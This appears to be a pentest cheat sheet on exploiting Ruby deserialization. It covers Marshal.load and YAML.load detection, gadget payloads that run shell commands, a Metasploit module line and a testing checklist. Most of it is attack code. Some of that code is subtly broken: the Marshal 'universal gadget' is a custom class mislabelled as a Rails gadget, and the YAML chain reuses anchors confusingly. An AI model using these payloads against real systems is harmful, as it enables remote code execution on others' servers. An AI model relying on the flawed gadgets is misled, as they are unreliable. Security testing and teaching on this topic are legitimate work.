# Ruby Deserialization (Marshal)

## Detection
```
Raw bytes start with: \x04\x08
Base64 encoded often starts with: BAh
```

## Marshal.load Exploitation

### Basic Structure
```ruby
# Vulnerable pattern:
Marshal.load(user_controlled_data)
```

### Universal RCE Gadget (Rails - ActiveSupport::Deprecation)
```ruby
require 'gem'

class Gadget
  def marshal_dump
    "custom_data"
  end
  def marshal_load(data)
    system("id")
  end
end

payload = Marshal.dump(Gadget.new)
```

## Rails-Specific Gadget Chains (via known CVEs)
```ruby
# Rails 4.x/5.x - ActionController / ActiveSupport gadgets
# Use tools rather than crafting manually:
# rails_double_tap_engine or universal-rce gadgets from Ruby community

# Common gadget class: Gem::Requirement / Gem::Installer combos
```

## YAML Deserialization (More Common Than Marshal in Practice)

### Detection
```yaml
--- !ruby/object:SomeClass
attribute: value
```

### Psych.load vs Psych.safe_load
```ruby
# Vulnerable:
YAML.load(user_input)          # Ruby < 3.1 defaults to unsafe load
Psych.load(user_input)

# Safe (restricts to basic types):
YAML.safe_load(user_input)
```

### RCE via YAML (Universal Gadget - Rails/Ruby)
```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
     read: 0
     header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
     socket: &1 !ruby/object:Gem::RequestSet
      sets: !ruby/object:Net::WriteAdapter
       socket: !ruby/module 'Kernel'
       method_id: :system
      git_set: "id"
     method_id: :resolve
```
(Exact gadget structure is version-dependent - use `universal-rce.rb` scripts from public Ruby security research repos in a lab)

### Rails-Specific YAML Gadget Tools
```bash
# Marshall.dump/YAML gadget generators exist in Metasploit modules
msfconsole
use exploit/multi/http/rails_devise_authenticity_token_yaml_rce  # example, verify version match
```

## Testing Checklist
```
1. Identify if Marshal.load or YAML.load(unsafe) is used with user input
2. Check Rails version (many gadgets are version/gem-dependent)
3. Try universal RCE gadgets available for the detected Ruby/Rails version
4. If YAML.safe_load is used, check for permitted_classes bypass (Symbol, Date, etc. allowed by default)
```

## Tools
```
Metasploit           # Rails-specific deserialization modules
universal-rce.rb      # Community-maintained Ruby YAML gadgets (verify against target's gem versions)
```
